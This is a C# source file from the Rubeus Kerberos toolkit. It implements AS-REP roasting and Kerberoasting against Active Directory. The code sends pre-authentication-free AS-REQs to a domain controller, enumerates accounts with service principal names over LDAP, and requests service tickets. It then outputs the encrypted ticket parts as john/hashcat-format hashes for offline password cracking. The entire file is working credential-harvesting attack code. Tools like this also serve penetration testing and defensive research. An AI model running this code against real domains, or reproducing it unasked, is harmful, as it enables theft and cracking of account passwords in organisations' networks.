using System;
using Asn1;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Security.Principal;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;

namespace Rubeus
{
    public class Roast
    {
        public static void ASRepRoast(string userName, string domain, string domainController = "", string format = "john")
        {
            GetASRepHash(userName, domain, domainController, format);
        }

        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "")
        {
            // roast AS-REPs for users without pre-authentication enabled

            Console.WriteLine("[*] Action: AS-REP Roasting");

            string dcIP = Networking.GetDCIP(domainController);
            if (String.IsNullOrEmpty(dcIP)) { return; }

            Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: '{0}\\{1}'", domain, userName);
            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac);

            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
            if (response == null)
            {
                return;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response, false);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == 11)
            {
                Console.WriteLine("[+] AS-REQ w/o preauth successful!");

                // parse the response to an AS-REP
                AS_REP rep = new AS_REP(response);

                // output the hash of the encrypted KERB-CRED in a crackable hash form
                string repHash = BitConverter.ToString(rep.enc_part.cipher).Replace("-", string.Empty);
                repHash = repHash.Insert(32, "$");

                string hashString = "";
                if(format == "john")
                {
                    hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
                }
                else if(format == "hashcat")
                {
                    hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
                }
                Console.WriteLine("[*] AS-REP hash:\r\n");

                // display the base64 of a hash, columns of 80 chararacters
                foreach (string line in Helpers.Split(hashString, 80))
                {
                    Console.WriteLine("      {0}", line);
                }
            }
            else if (responseTag == 30)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
        }

        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", System.Net.NetworkCredential cred = null)
        {
            Console.WriteLine("[*] Action: Kerberoasting");

            if (!String.IsNullOrEmpty(spn))
            {
                Console.WriteLine("\r\n[*] ServicePrincipalName   : {0}", spn);
                GetDomainSPNTicket(spn);
            }
            else
            {
                DirectoryEntry directoryObject = null;
                DirectorySearcher userSearcher = null;
                string bindPath = "";

                try
                {
                    if (cred != null)
                    {
                        if (!String.IsNullOrEmpty(OUName))
                        {
                            string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
                            bindPath = String.Format("LDAP://{0}/{1}", cred.Domain, ouPath);
                        }
                        else
                        {
                            bindPath = String.Format("LDAP://{0}", cred.Domain);
                        }
                    }
                    else if (!String.IsNullOrEmpty(OUName))
                    {
                        string ouPath = OUName.Replace("ldap", "LDAP").Replace("LDAP://", "");
                        bindPath = String.Format("LDAP://{0}", ouPath);
                    }

                    if (!String.IsNullOrEmpty(bindPath))
                    {
                        directoryObject = new DirectoryEntry(bindPath);
                    }
                    else
                    {
                        directoryObject = new DirectoryEntry();
                    }

                    if (cred != null)
                    {
                        // if we're using alternate credentials for the connection
                        string userDomain = String.Format("{0}\\{1}", cred.Domain, cred.UserName);
                        directoryObject.Username = userDomain;
                        directoryObject.Password = cred.Password;

                        using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, cred.Domain))
                        {
                            if (!pc.ValidateCredentials(cred.UserName, cred.Password))
                            {
                                Console.WriteLine("\r\n[X] Credentials supplied for '{0}' are invalid!", userDomain);
                                return;
                            }
                        }
                    }

                    userSearcher = new DirectorySearcher(directoryObject);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
                    return;
                }

                // check to ensure that the bind worked correctly
                try
                {
                    Guid guid = directoryObject.Guid;
                }
                catch (DirectoryServicesCOMException ex)
                {
                    if (!String.IsNullOrEmpty(OUName))
                    {
                        Console.WriteLine("\r\n[X] Error creating the domain searcher for bind path \"{0}\" : {1}", OUName, ex.Message);
                    }
                    else
                    {
                        Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
                    }
                    return;
                }

                try
                {
                    if (String.IsNullOrEmpty(userName))
                    {
                        userSearcher.Filter = "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt))";
                    }
                    else
                    {
                        userSearcher.Filter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName={0}))", userName);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\r\n[X] Error settings the domain searcher filter: {0}", ex.InnerException.Message);
                    return;
                }

                try
                {
                    SearchResultCollection users = userSearcher.FindAll();

                    foreach (SearchResult user in users)
                    {
                        string samAccountName = user.Properties["samAccountName"][0].ToString();
                        string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                        string servicePrincipalName = user.Properties["servicePrincipalName"][0].ToString();
                        Console.WriteLine("\r\n[*] SamAccountName         : {0}", samAccountName);
                        Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
                        Console.WriteLine("[*] ServicePrincipalName   : {0}", servicePrincipalName);
                        GetDomainSPNTicket(servicePrincipalName, userName, distinguishedName, cred);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\r\n  [X] Error executing the domain searcher: {0}", ex.InnerException.Message);
                    return;
                }
            }
            //else - search for user/OU/etc.
        }

        public static void GetDomainSPNTicket(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null)
        {
            string domain = "DOMAIN";

            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
            {
                // extract the domain name from the distinguishedname
                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
                string domainDN = dnMatch.Groups["Domain"].ToString();
                domain = domainDN.Replace("DC=", "").Replace(',', '.');
            }

            try
            {
                // the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach and extraction of the AP-REQ from the
                //  GetRequest() stream was constributed to PowerView by @machosec
                System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
                if (cred != null)
                {
                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
                }
                else
                {
                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
                }
                byte[] requestBytes = ticket.GetRequest();

                if ( !((requestBytes[15] == 1) && (requestBytes[16] == 0)) )
                {
                    Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
                    return;
                }

                // ignore the GSSAPI frame
                byte[] apReqBytes = new byte[requestBytes.Length-17];
                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);

                AsnElt apRep = AsnElt.Decode(apReqBytes);

                if (apRep.TagValue != 14)
                {
                    Console.WriteLine("\r\n[X] Incorrect ASN application tag.  Expected 14, but got {0}.\r\n", apRep.TagValue);
                }

                long encType = 0;

                foreach (AsnElt elem in apRep.Sub[0].Sub)
                {
                    if (elem.TagValue == 3)
                    {
                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                        {
                            if(elem2.TagValue == 3)
                            {
                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                {
                                    if (elem3.TagValue == 0)
                                    {
                                        encType = elem3.Sub[0].GetInteger();
                                    }

                                    if (elem3.TagValue == 2)
                                    {
                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");

                                        string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));

                                        bool header = false;
                                        foreach (string line in Helpers.Split(hash, 80))
                                        {
                                            if (!header)
                                            {
                                                Console.WriteLine("[*] Hash                   : {0}", line);
                                            }
                                            else
                                            {
                                                Console.WriteLine("                             {0}", line);
                                            }
                                            header = true;
                                        }
                                        Console.WriteLine();
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
            }
        }
    }
}